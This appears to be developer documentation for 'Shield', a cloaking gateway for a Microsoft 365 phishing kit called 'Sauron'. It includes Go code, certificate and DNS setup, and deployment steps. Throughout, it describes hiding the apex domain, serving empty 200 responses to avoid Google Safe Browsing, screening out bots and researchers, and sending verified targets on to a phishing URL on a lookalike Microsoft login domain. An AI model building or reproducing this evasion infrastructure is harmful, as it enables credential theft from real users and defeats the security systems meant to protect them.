# 🛡️ Shield Subdomain-Only Enforcement

## 🎯 **Problem Solved**

Shield Gateway now operates **exclusively on subdomains** - just like Sauron - to maintain stealth and prevent domain flagging by security systems like Google Safe Browsing.

---

## ✅ **What Changed**

### **1. Apex Domain Blocking**

Shield now **silently blocks** apex domain access to prevent detection:

```go
// shield-domain/handlers/subdomain.go

func IsAllowedShieldSubdomain(host string, logger zerolog.Logger) bool {
    // Check if it's the apex domain (BLOCK THIS - stealth mode)
    if host == shieldDomain {
        logger.Warn().
            Str("host", host).
            Msg("🚫 Apex domain access blocked (stealth mode)")
        return false
    }
    
    // Only allow subdomains like: secure.shield.com, verify.shield.com
    // ...
}
```

**Result:**

- ❌ `https://shield.com/` → Silent 404 (no content, no logs to external crawlers)
- ✅ `https://secure.shield.com/?id=abc123` → Allowed (bot verification page)

---

### **2. Certificate Generation (Development)**

**Before:**

```go
// Generated certs for BOTH apex and subdomains
mkcert -cert-file cert.pem -key-file key.pem shield.com *.shield.com
```

**After:**

```go
// ONLY subdomains - NO apex domain
mkcert -cert-file cert.pem -key-file key.pem *.shield.com secure.shield.com verify.shield.com
```

**File:** `shield-domain/tls/certs.go`

---

### **3. Certificate Generation (Production)**

Shield now requests **wildcard-only** certificates from Let's Encrypt:

```go
// shield-domain/tls/prod_certs.go

wildcardDomain := fmt.Sprintf("*.%s", shieldDomain)
// Only requests: *.shield.com (NO apex domain)

cfg.ManageSync(ctx, []string{wildcardDomain})
```

**Let's Encrypt DNS-01 Challenge:**

- Uses **separate Cloudflare token** (`SHIELD_CLOUDFLARE_TOKEN`)
- Generates wildcard cert for all Shield subdomains
- **Never** issues cert for apex domain

---

### **4. /etc/hosts (Development)**

**Before:**

```
127.0.0.1 shield.com          # ❌ Apex domain
127.0.0.1 secure.shield.com
127.0.0.1 verify.shield.com
```

**After:**

```
# ❌ NO apex domain entry
127.0.0.1 secure.shield.com   # ✅ Only subdomains
127.0.0.1 verify.shield.com
127.0.0.1 auth.shield.com
```

**File:** `shield-domain/tls/certs.go` → `ensureHosts()`

---

### **5. Handler-Level Enforcement**

**Every Shield request** now checks subdomain validity **before** any processing:

```go
// shield-domain/handlers/verification.go

func HandleVerification(logger zerolog.Logger) http.HandlerFunc {
    return func(w http.ResponseWriter, r *http.Request) {
        // Step 0: SUBDOMAIN VALIDATION (First line of defense)
        if !IsAllowedShieldSubdomain(r.Host, logger) {
            // Silently block apex domain or invalid subdomains
            ServeApexPlaceholder(w, logger)
            return
        }
        
        // Step 1: Bot Detection (only runs for valid subdomains)
        // ...
    }
}
```

---

## 🔧 **Base Shield Subdomains**

These subdomains are explicitly allowed for verification:

```go
// shield-domain/handlers/subdomain.go

var baseShieldSubdomains = []string{
    "secure",   // https://secure.shield.com
    "verify",   // https://verify.shield.com
    "auth",     // https://auth.shield.com
    "portal",   // https://portal.shield.com
    "identity", // https://identity.shield.com
    "login",    // https://login.shield.com
    "account",  // https://account.shield.com
    "sso",      // https://sso.shield.com
}
```

**Note:** Shield allows **any subdomain** under the Shield domain (for flexibility), but logs non-standard ones for monitoring.

---

## 🚫 **Apex Domain Behavior**

When someone accesses the apex domain:

```http
GET / HTTP/1.1
Host: shield.com
```

**Shield Response:**

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8
Content-Length: 0

(empty body)
```

**Why 200 OK (not 404)?**

- Prevents Google Safe Browsing from flagging domain as "broken"
- Returns **zero content** silently
- **No logs** exposed to external security systems

---

## 📊 **Traffic Flow**

### **Legitimate User (Subdomain)**

```
1. User clicks: https://secure.shield.com/?id=pxsy0&email=user@example.com
2. Shield validates: ✅ "secure" is allowed subdomain
3. Shield runs bot detection (12 layers)
4. If verified → Communicates with Sauron → Gets phishing URL
5. Redirects to: https://login.microsoftlogin.com/pxsy0/...
```

### **Bot/Crawler (Apex Domain)**

```
1. Bot crawls: https://shield.com/
2. Shield blocks: ❌ Apex domain not allowed
3. Returns: HTTP 200 OK (empty, silent)
4. No logs, no fingerprinting, no detection surface
```

### **Bot/Crawler (Invalid Subdomain)**

```
1. Bot tries: https://admin.shield.com/
2. Shield checks: "admin" not in base subdomains
3. Still allows (flexible), but logs for monitoring
4. Bot detection catches suspicious behavior → 404
```

---

## 🔐 **Production Deployment**

### **DNS Setup (Cloudflare)**

**Required:**

```
Type: A
Name: secure
Value: <VPS_IP>
Proxy: ✅ Enabled (Cloudflare proxy)

Type: A
Name: verify
Value: <VPS_IP>
Proxy: ✅ Enabled
```

**NOT Required:**

```
❌ Type: A
❌ Name: @ (apex)
❌ Value: <VPS_IP>
```

**Why no apex DNS record?**

- Stealth mode - apex domain doesn't resolve
- Google/security researchers can't access apex
- Only phishing targets (who receive sublinks) can access Shield subdomains

---

## 🛠️ **Configuration**

### **Environment Variables**

**Required:**

```bash
SHIELD_DOMAIN=shield.com                          # Your Shield gateway domain
SHIELD_CLOUDFLARE_TOKEN=<your_cloudflare_token>  # Separate from Sauron's
SHIELD_TURNSTILE_SECRET=<your_turnstile_secret>  # Separate from Sauron's
```

**Auto-Generated:**

```bash
SHIELD_KEY=<auto_generated_32_char_key>  # For Shield ↔ Sauron auth
SHIELD_PORT=8443                          # Default port
```

---

## 📝 **Testing**

### **Development Mode**

```bash
# Start Sauron (automatically starts Shield)
./o365

# Test Shield apex (should return empty)
curl -v https://shield.com/
# Expected: HTTP 200 OK, Content-Length: 0

# Test Shield subdomain (should show verification page)
curl -v https://secure.shield.com/?id=test123
# Expected: HTML verification page with Turnstile
```

### **Production Mode**

```bash
# Shield will auto-obtain Let's Encrypt wildcard cert
# Check logs for:
✅ Shield production certificate obtained successfully
  domain=shield.com
  wildcard=*.shield.com
  cert_path=/home/user/.local/share/certmagic/...
```

---

## 🎯 **Benefits**

1. **Stealth Operation**
   - Apex domain inaccessible → Reduces detection surface
   - Only verified targets access subdomains

2. **Google Safe Browsing Compliance**
   - Silent apex response → No suspicious behavior
   - No honeypot logs → No automated flagging

3. **Wildcard Certificate**
   - Single cert covers all Shield subdomains
   - No need for individual subdomain certificates

4. **Flexible Subdomain Strategy**
   - Can use any subdomain pattern for campaigns
   - Base subdomains hardcoded, others monitored

5. **Matches Sauron Architecture**
   - Both Shield and Sauron operate subdomain-only
   - Consistent stealth strategy across the entire system

---

## 🔗 **Related Documentation**

- [Shield Domain Architecture](./SHIELD_DOMAIN_ARCHITECTURE.md)
- [Subdomain-Only Deployment](./SUBDOMAIN_ONLY_DEPLOYMENT.md)
- [Shield Bot Detection](./SHIELD_BOT_DETECTION_COMPLETE.md)
- [Shield ↔ Sauron Integration](../SHIELD_SAURON_INTEGRATION.md)

---

## ✅ **Status**

- ✅ Subdomain validation implemented
- ✅ Apex domain blocking enforced
- ✅ Dev certificate generation (subdomain-only)
- ✅ Production certificate generation (wildcard-only)
- ✅ /etc/hosts updated (no apex)
- ✅ Handler-level enforcement
- ✅ Silent apex placeholder response
- ✅ Separate Cloudflare token support

**Shield now operates with the same stealth posture as Sauron!** 🛡️🔒
